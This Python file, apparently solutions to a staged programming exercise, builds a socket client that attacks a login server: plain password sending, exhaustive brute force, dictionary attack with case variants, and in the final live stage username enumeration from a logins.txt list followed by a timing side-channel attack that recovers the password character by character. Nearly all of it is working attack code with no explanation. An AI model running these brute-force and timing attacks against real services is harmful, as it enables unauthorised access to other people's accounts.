# -------------------------------------------STAGE 1-------------------------------------------
# import socket
# import sys
#
# if len(sys.argv) != 4:
#     print("error")
# else:
#     hostname = sys.argv[1]
#     port = int(sys.argv[2])
#     psw = sys.argv[3]
#
#     with socket.socket() as my_s:
#         my_s.connect((hostname, port))
#         my_s.send(psw.encode())
#
#         respond = my_s.recv(1024).decode()
#         print(respond)

# -------------------------------------------STAGE 2-------------------------------------------
# import itertools
# import socket
# import string
# import sys
#
# NUMBERS = [str(x) for x in range(10)]
# LITERAS = list(string.ascii_lowercase)
#
# if len(sys.argv) != 3:
#     print("error")
#     sys.exit()
#
# hostname = sys.argv[1]
# port = int(sys.argv[2])
#
# with socket.socket() as my_s:
#     my_s.connect((hostname, port))
#
#     i = 1
#     finished = False
#     while not finished:
#         for attempt in itertools.combinations(NUMBERS + LITERAS, i):
#             attempt = "".join(attempt)
#             my_s.send(attempt.encode())
#             respond = my_s.recv(1024).decode()
#             if respond == "Connection success!":
#                 print(attempt)
#                 finished = True
#                 break
#         i += 1

# -------------------------------------------STAGE 3-------------------------------------------
# import itertools
# import socket
# import string
# import sys
#
# NUMBERS = [str(x) for x in range(10)]
# LITERAS = list(string.ascii_lowercase)
#
#
# def generate_passwords():
#     with open('passwords.txt', 'r') as reader:
#         for line in reader.readlines():
#             password1 = line[:-1]
#             pp = []
#             for i in range(len(password1)):
#                 if password1[i] in NUMBERS:
#                     pp.append([password1[i]])
#                 elif password1[i].lower() in LITERAS:
#                     pp.append([password1[i].lower(), password1[i].upper()])
#             possible_passwords = []
#             for elem in itertools.product(*pp):
#                 possible_passwords.append("".join(elem))
#             yield possible_passwords
#
# hostname = sys.argv[1]
# port = int(sys.argv[2])
#
# with socket.socket() as my_s:
#     my_s.connect((hostname, port))
#
#     password_generator = generate_passwords()
#     finished = False
#     while not finished:
#         passwords = next(password_generator)
#         for password in passwords:
#             my_s.send(password.encode())
#             respond = my_s.recv(1024).decode('utf8')
#             if respond == "Connection success!":
#                 print(password)
#                 finished = True
#                 break

# -------------------------------------------STAGE 4-------------------------------------------
import itertools
import socket
import string
import sys
import json
import time
from time import perf_counter

NUMBERS = [str(x) for x in range(10)]
LITERAS = list(string.ascii_letters)


def generate_passwords(prefix):
    for symbol in itertools.chain(NUMBERS, LITERAS):
        yield prefix + symbol


def generate_logins():
    with open('logins.txt', 'r') as reader:
        for _login in reader.readlines():
            yield _login[:-1]


hostname = sys.argv[1]
port = int(sys.argv[2])

with socket.socket() as my_s:
    my_s.connect((hostname, port))

    # hack the login
    login_generator = generate_logins()
    for login in login_generator:
        msg = {"login": login, "password": " "}
        msg_json = json.dumps(msg)
        my_s.send(msg_json.encode())
        respond_json = my_s.recv(1024).decode('utf8')
        respond = json.loads(respond_json)
        if respond['result'] == "Wrong password!":
            break

    # hack the password
    prefix = ''
    finished = False
    while not finished:
        password_generator = generate_passwords(prefix)
        for password in password_generator:
            msg = {"login": login, "password": password}
            msg_json = json.dumps(msg)
            start = time.perf_counter()
            my_s.send(msg_json.encode())
            respond_json = my_s.recv(1024).decode('utf8')
            end = time.perf_counter()
            respond = json.loads(respond_json)
            if respond['result'] == "Connection success!":
                finished = True
                break
            if end - start >= 0.09:
                prefix = password
                break

    print(msg_json)

